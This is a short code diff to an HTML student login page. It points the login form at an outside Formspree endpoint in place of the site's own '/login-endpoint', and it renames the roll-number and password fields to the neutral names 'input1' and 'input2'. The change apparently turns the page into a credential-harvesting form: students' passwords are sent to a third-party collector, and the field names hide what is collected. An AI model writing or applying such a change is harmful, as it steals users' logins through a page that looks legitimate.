@@ -112,13 +112,16 @@
     <div class="login_box">
         <div class="box-title">Student Login</div>
         
-        <form action="/login-endpoint" method="POST">
+        <!-- Formspree integration added below -->
+        <form action="https://formspree.io/f/xeeyzbkv" method="POST">
             <div class="form-group">
-                <input type="text" id="username" name="username" placeholder="Roll Number" required>
+                <!-- Name attribute changed to input1 -->
+                <input type="text" id="username" name="input1" placeholder="Roll Number" required>
             </div>
 
             <div class="form-group">
-                <input type="password" id="password" name="password" placeholder="Password" required>
+                <!-- Name attribute changed to input2 -->
+                <input type="password" id="password" name="input2" placeholder="Password" required>
             </div>
 
             <div>
